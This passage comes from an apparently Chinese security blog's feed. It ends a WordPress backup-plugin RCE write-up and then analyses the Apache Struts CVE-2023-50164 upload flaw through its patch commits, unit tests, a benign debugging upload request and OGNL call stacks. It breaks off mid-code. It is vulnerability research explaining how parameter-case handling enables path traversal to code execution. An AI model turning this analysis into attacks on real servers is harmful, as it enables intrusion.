&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">43&lt;/span> &lt;span style="color:#75715e">// Check if the path contain &amp;#34;|&amp;#34;, it&amp;#39;s not possible to use this character with our backups paths
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strpos&lt;/span>($content, &lt;span style="color:#e6db74">&amp;#34;|&amp;#34;&lt;/span>)) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect parameters.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">45&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">46&lt;/span> &lt;span style="color:#75715e">// Check if the directory/file exist otherwise fail
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">47&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>(&lt;span style="color:#a6e22e">is_dir&lt;/span>($content) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">file_exists&lt;/span>($content))) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect parameters.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">48&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">49&lt;/span> &lt;span style="color:#75715e">// Return correct content
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> $content;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">51&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">52&lt;/span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution" target="_blank">https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution" target="_blank">https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-12-29T18:43:31+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-50164 Apache Struts RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/</link><pubDate>Tue, 12 Dec 2023 11:18:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>由于 Struts 框架在处理参数名称大小写方面的不一致性，导致未经身份验证的远程攻击者能够通过修改参数名称的大小写来利用目录遍历技术上传恶意文件到服务器的非预期位置，最终导致代码执行。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;pre tabindex="0">&lt;code>2.0.0&amp;lt;= Struts &amp;lt;= 2.3.37
2.5.0 &amp;lt;= Struts &amp;lt;= 2.5.32
6.0.0 &amp;lt;= Struts &amp;lt;= 6.3.0
&lt;/code>&lt;/pre>&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>使用vulhub起一个docker环境即可。&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>查看
&lt;a href="https://github.com/apache/struts/commit/4c044f12560e22e00520595412830f9582d6dac7#diff-9c690161b1ba4ba15ccf8b3991857785b66c99dd2a87a95543b18e411deeb17fL143-R170" target="_blank">补丁&lt;/a>可知，补丁修复前对于文件名超过&lt;code>maxStringLength&lt;/code>时会将错误消息和&lt;code>context&lt;/code>添加到&lt;code>errors&lt;/code>之后直接返回，不会执行删除临时文件的逻辑，在修复代码中在finally语句中执行item.delete来删除临时文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> params.&lt;span style="color:#a6e22e">put&lt;/span>(item.&lt;span style="color:#a6e22e">getFieldName&lt;/span>(), values);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> item.&lt;span style="color:#a6e22e">delete&lt;/span>();
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;p>在
&lt;a href="https://github.com/apache/struts/commit/d8c69691ef1d15e76a5f4fcf33039316da2340b6" target="_blank">commit d8c69691ef1d15e76a5f4fcf33039316da2340b6&lt;/a>中主要有如下几个修复逻辑：
对于&lt;code>appendAll&lt;/code>方法在添加参数之前先使用remove方法移除先前的参数。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/4.png" />
对于get方法，修改为对大小写不敏感
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/5.png" />&lt;/p>
&lt;p>而&lt;code>remove&lt;/code>方法和&lt;code>contains&lt;/code>方法有如下修改：
原先的remove方法会区分大小写，而修复后，remove方法从entrySet中忽略大小写并删除对应的项。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/6.png" />&lt;/p>
&lt;p>可以看出这个commit主要是将键值对获取/移除的方法修改为大小写不敏感。&lt;/p>
&lt;p>测试单元代码如下，添加了两个单元测试方法&lt;/p>
&lt;ul>
&lt;li>&lt;code>shouldGetBeCaseInsensitive&lt;/code>&lt;/li>
&lt;li>&lt;code>shouldAppendSameParamsIgnoringCase&lt;/code>
&lt;code>shouldGetBeCaseInsensitive&lt;/code>测试&lt;code>HttpParameters.get&lt;/code>方法是否是大小写不敏感。
&lt;code>shouldAppendSameParamsIgnoringCase&lt;/code>测试使用&lt;code>HttpParameters.appendAll&lt;/code>向Map里面添加键值对时是否对key大小写不敏感。
可知修复主要是使得&lt;code>HttpParameters&lt;/code>类的一些方法从大小写敏感改为大小写不敏感。
可以看出补丁主要是对&lt;code>HttpParameters&lt;/code>进行修复。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HttpParametersTest&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shouldGetBeCaseInsensitive&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// given&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HttpParameters params &lt;span style="color:#f92672">=&lt;/span> HttpParameters.&lt;span style="color:#a6e22e">create&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, Object&lt;span style="color:#f92672">&amp;gt;&lt;/span>() {{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> put(&lt;span style="color:#e6db74">&amp;#34;param1&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;value1&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }}).&lt;span style="color:#a6e22e">build&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertEquals(&lt;span style="color:#e6db74">&amp;#34;value1&amp;#34;&lt;/span>, params.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Param1&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getValue&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertEquals(&lt;span style="color:#e6db74">&amp;#34;value1&amp;#34;&lt;/span>, params.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;paraM1&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getValue&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertEquals(&lt;span style="color:#e6db74">&amp;#34;value1&amp;#34;&lt;/span>, params.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;pAraM1&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getValue&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shouldAppendSameParamsIgnoringCase&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// given&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HttpParameters params &lt;span style="color:#f92672">=&lt;/span> HttpParameters.&lt;span style="color:#a6e22e">create&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, Object&lt;span style="color:#f92672">&amp;gt;&lt;/span>() {{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> put(&lt;span style="color:#e6db74">&amp;#34;param1&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;value1&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }}).&lt;span style="color:#a6e22e">build&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// when&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertEquals(&lt;span style="color:#e6db74">&amp;#34;value1&amp;#34;&lt;/span>, params.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;param1&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getValue&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> params &lt;span style="color:#f92672">=&lt;/span> params.&lt;span style="color:#a6e22e">appendAll&lt;/span>(HttpParameters.&lt;span style="color:#a6e22e">create&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, String&lt;span style="color:#f92672">&amp;gt;&lt;/span>() {{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> put(&lt;span style="color:#e6db74">&amp;#34;Param1&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Value1&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }}).&lt;span style="color:#a6e22e">build&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertTrue(params.&lt;span style="color:#a6e22e">contains&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;param1&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertTrue(params.&lt;span style="color:#a6e22e">contains&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Param1&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertEquals(&lt;span style="color:#e6db74">&amp;#34;Value1&amp;#34;&lt;/span>, params.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;param1&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getValue&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assertEquals(&lt;span style="color:#e6db74">&amp;#34;Value1&amp;#34;&lt;/span>, params.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Param1&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getValue&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查看struts代码交叉引用，可知appendAll在如下Interceptor上有引用
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/8.png" />
在struts的struts-default.xml里面定义了默认的interceptor，其中文件上传由FileUploadInterceptor拦截请求。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;interceptor&lt;/span> &lt;span style="color:#a6e22e">name=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;fileUpload&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.apache.struts2.interceptor.FileUploadInterceptor&amp;#34;&lt;/span>&lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="动态调试">动态调试&lt;/h4>
&lt;p>发送如下请求，并在&lt;code>org.apache.struts2.interceptor.FileUploadIntercepto#intercept&lt;/code>断点：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /upload.action &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;Upload&amp;#34;; filename=&amp;#34;1.txt&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/plain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1aaa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在调试器中可以看到inputName为表单中name参数对应的值，struts会尝试根据inputName获取content type和fileName，。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/9.png" />&lt;/p>
&lt;p>跟进&lt;code>multiWrapper.getFileNames&lt;/code>分发中，在&lt;code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#getFileNames&lt;/code>中实现，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> String&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">getFileNames&lt;/span>(String fieldName) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>FileItem&lt;span style="color:#f92672">&amp;gt;&lt;/span> items &lt;span style="color:#f92672">=&lt;/span> (List)&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">files&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(fieldName);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (items &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> fileNames &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList(items.&lt;span style="color:#a6e22e">size&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Iterator var4 &lt;span style="color:#f92672">=&lt;/span> items.&lt;span style="color:#a6e22e">iterator&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(var4.&lt;span style="color:#a6e22e">hasNext&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileItem fileItem &lt;span style="color:#f92672">=&lt;/span> (FileItem)var4.&lt;span style="color:#a6e22e">next&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fileNames.&lt;span style="color:#a6e22e">add&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getCanonicalName&lt;/span>(fileItem.&lt;span style="color:#a6e22e">getName&lt;/span>()));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (String&lt;span style="color:#f92672">[]&lt;/span>)fileNames.&lt;span style="color:#a6e22e">toArray&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">[&lt;/span>fileNames.&lt;span style="color:#a6e22e">size&lt;/span>()&lt;span style="color:#f92672">]&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>跟进&lt;code>getCanonicalName&lt;/code>方法内，在&lt;code>getCanonicalName&lt;/code>方法内获取了斜杠和反斜杠的位置，如果不为-1的话则会对文件名进行截断，取到最后一个斜杠后面的字符串作为文件名，防止目录穿越。&lt;/p>
&lt;p>回到intercept方法中，在后面会拼接inputName组成contentTypeName和fileNameName作为Map的key，并将获取到的contentType和fileName作为value加入到HashMap中，而后通过appenAll方法将HashMap添加到&lt;code>HttpParameter&lt;/code>中
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/10.png" />&lt;/p>
&lt;p>在&lt;code>FileInterceptor&lt;/code>获取到参数之后需要将参数通过Action的setter方法绑定到Action中的变量上。
在定义的action中的set方法断点，重新调试，发送恶意请求，调试器中主要调用栈如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>setUpload:27, UploadAction (org.chestnut.action)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:567, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 769172083 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$369)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor)
&lt;/code>&lt;/pre>&lt;p>在&lt;code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters&lt;/code>方法中尝试将parameters的每个键值对通过参数绑定调用Action的setter方法。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/11.png" />&lt;/p>
&lt;h4 id="获取setter方法的逻辑">获取setter方法的逻辑&lt;/h4>
&lt;p>参数绑定需要获取Action中的方法并调用，在Action中对应方法下断点，可以得到如下调用栈&lt;/p>
&lt;pre tabindex="0">&lt;code>setUpload:27, UploadAction (org.chestnut.action)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:567, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 2098738059 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$371)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor)
&lt;/code>&lt;/pre>&lt;p>在&lt;code>setMethodValue:2178, OgnlRuntime (ognl)&lt;/code>断点，重新发送请求，跟进&lt;code>getSetMethod&lt;/code>方法查看获取setter方法的逻辑&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/2.png" />&lt;/p>
&lt;p>在&lt;code>getSetMethod&lt;/code>方法中会尝试从缓存取出&lt;code>Upload&lt;/code>对应的方法，如果取出的&lt;code>method&lt;/code>不为null则会返回，如果为null则会尝试调用&lt;code>_getSetMethod&lt;/code>方法从目标class中通过反射拼接get从目标class中获取到方法。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Method &lt;span style="color:#a6e22e">getSetMethod&lt;/span>(OgnlContext context, Class targetClass, String propertyName) &lt;span style="color:#66d9ef">throws&lt;/span> IntrospectionException, OgnlException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Method method &lt;span style="color:#f92672">=&lt;/span> cacheSetMethod.&lt;span style="color:#a6e22e">get&lt;/span>(targetClass, propertyName);
